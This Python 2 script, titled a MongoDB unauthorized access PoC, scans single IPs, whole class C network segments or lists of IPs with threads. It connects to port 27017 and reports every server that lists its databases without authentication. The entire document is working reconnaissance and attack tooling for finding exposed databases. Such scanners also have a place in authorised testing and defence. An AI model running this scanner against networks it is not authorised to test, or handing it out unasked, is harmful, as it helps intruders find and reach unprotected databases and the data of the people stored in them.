#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Mongodb unauthorized access vulnerability PoC

Author: p0wd3r
'''

import argparse
import time
import threading
import Queue
import pymongo
from colorama import Fore, Style, init


class MongodbPoC(object):

    thread_lock = threading.Lock()
    msg_type = {
        'info': Style.BRIGHT + Fore.CYAN + '[*] ' + Style.RESET_ALL,
        'warning': Style.BRIGHT + Fore.YELLOW + '[!] ' + Style.RESET_ALL,
        'error': Style.BRIGHT + Fore.RED + '[-] ' + Style.RESET_ALL,
        'ok': Style.BRIGHT + Fore.GREEN + '[+] ' + Style.RESET_ALL
    }

    def index(self):
        """arg list"""
        init(autoreset=True)

        parser = argparse.ArgumentParser(description=
                                         'Mongodb unauthorized access vulnerability PoC')
        group = parser.add_mutually_exclusive_group()
        group.add_argument('-i', help='IP', dest='ip')
        group.add_argument('-s', help='class C network segment', dest='segment')
        group.add_argument('-f', help='IP file', dest='ip_file')
        parser.add_argument('-n', help='thread num', dest='thread_num', default=10)
        args = parser.parse_args()

        q = Queue.Queue()

        if args.ip:
            self.connect_mongo(args.ip)
        elif args.segment:
            for i in xrange(0, 255):
                ip = args.segment.rpartition('.')[0] + '.' + str(i)
                q.put(ip)
            self.start_thread(q, args.thread_num)
        elif args.ip_file:
            with open(args.ip_file, 'r') as f:
                for ip in f:
                    q.put(ip)
            self.start_thread(q, args.thread_num)

    def start_thread(self, q, thread_num):
        """start thread"""
        for i in xrange(0, thread_num):
            thread = threading.Thread(target=self.thread_handler, args=(q,))
            thread.daemon = True
            thread.start()
        while threading.activeCount() > 1:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                exit('\n' + self.msg_type['error'] + 'User aborted')

    def thread_handler(self, q):
        """thread handler"""
        while not q.empty():
            ip = q.get()
            self.connect_mongo(ip)

    def connect_mongo(self, ip):
        """connect db to test vulnerability"""
        with self.thread_lock:
            print self.msg_type['info'] + 'Connect ' + ip + ':27017'
        try:
            client = pymongo.MongoClient(ip, 27017, socketTimeoutMS=3000)
            dbs = client.database_names()
            if dbs:
                with self.thread_lock:
                    print self.msg_type['ok'] + 'Success'
        except Exception, e:
            with self.thread_lock:
                print self.msg_type['error'] + str(e)
                print self.msg_type['error'] + 'This ip seems to be invulnerable'


if __name__ == '__main__':
    m = MongodbPoC()
    m.index()
